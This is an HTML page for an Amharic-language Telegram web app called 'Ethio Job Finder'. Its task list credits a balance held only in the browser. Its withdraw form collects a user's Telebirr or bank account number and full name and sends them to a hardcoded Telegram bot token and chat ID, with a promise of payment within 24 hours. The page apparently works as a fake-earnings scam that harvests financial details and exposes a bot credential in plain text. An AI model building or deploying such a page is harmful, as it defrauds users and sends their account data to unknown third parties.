<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ethio Job Finder - Professional</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --primary: #2c3e50; --success: #27ae60; --bg: #f4f7f6; }
        body { font-family: 'Helvetica Neue', sans-serif; background: var(--bg); margin: 0; padding-bottom: 90px; }
        .header { background: var(--primary); color: white; padding: 30px 20px; text-align: center; }
        .balance-box { background: white; margin: -20px 20px 20px; padding: 20px; border-radius: 15px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .bal-text { font-size: 2em; font-weight: bold; color: var(--primary); }
        .card { background: white; padding: 15px; margin: 10px 20px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .btn { background: var(--primary); color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .btn-withdraw { background: var(--success); width: 90%; margin: 20px; padding: 15px; }
        #withdraw-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
        .modal-content { background: white; margin: 20% auto; padding: 20px; width: 80%; border-radius: 15px; }
        input, select { width: 92%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 5px; }
    </style>
</head>
<body>

<div id="home" class="page active">
    <div class="header"><h2>Ethio Job Finder</h2></div>
    <div class="balance-box">
        <p>ጠቅላላ ገቢዎ</p>
        <div class="bal-text">💰 <span id="main-bal">0.00</span> ETB</div>
    </div>
    <div id="task-list"></div>
</div>

<div id="withdraw-modal">
    <div class="modal-content">
        <h3>የክፍያ መረጃ</h3>
        <select id="method"><option>ቴሌብር (Telebirr)</option><option>ንግድ ባንክ (CBE)</option></select>
        <input type="text" id="acc" placeholder="የስልክ ወይም አካውንት ቁጥር">
        <input type="text" id="name" placeholder="ሙሉ ስም">
        <button class="btn" style="width: 100%; background: var(--success);" onclick="submitWithdraw()">ጥያቄ ይላኩ</button>
    </div>
</div>

<div style="position: fixed; bottom: 0; width: 100%; background: white; padding: 15px; text-align: center; border-top: 1px solid #eee;">
    <button class="btn btn-withdraw" onclick="document.getElementById('withdraw-modal').style.display='block'">💸 የክፍያ ጥያቄ (Withdraw)</button>
</div>

<script>
    let balance = 0.00;
    
    function addMoney(amt) {
        balance += amt;
        document.getElementById('main-bal').innerText = balance.toFixed(2);
    }

    function submitWithdraw() {
        const method = document.getElementById('method').value;
        const acc = document.getElementById('acc').value;
        const name = document.getElementById('name').value;
        const token = "8638798872:AAGaKoLv9VSRRK3nI7UPx8iJc6byQ5L3tBc";
        const cid = "7821771120";

        if(acc && name) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=አዲስ+ክፍያ!+ዘዴ:${method},+ቁጥር:${acc},+ስም:${name},+መጠን:${balance.toFixed(2)}ETB`);
            alert("ጥያቄዎ ተልኳል! በ 24 ሰዓት ውስጥ ይከፈላል።");
            document.getElementById('withdraw-modal').style.display = 'none';
        } else { alert("እባክዎን መረጃ ይሙሉ"); }
    }

    const tasks = [
        {t: "ዩቲዩብ ቪዲዮ ማየት", r: 5}, {t: "ቴሌግራም መቀላቀል", r: 3}, {t: "አፕ መጫን", r: 15},
        {t: "ቲክቶክ ላይክ", r: 2}, {t: "ፌስቡክ ሼር", r: 4}, {t: "ዌብሳይት መጎብኘት", r: 3}
    ];

    tasks.forEach(task => {
        document.getElementById('task-list').innerHTML += `
            <div class="card">
                <div><b>${task.t}</b><br><small>+${task.r} ETB</small></div>
                <button class="btn" onclick="addMoney(${task.r}); this.disabled=true; this.innerText='ተጠናቀቀ'">ስራ</button>
            </div>`;
    });
</script>
</body>
</html>
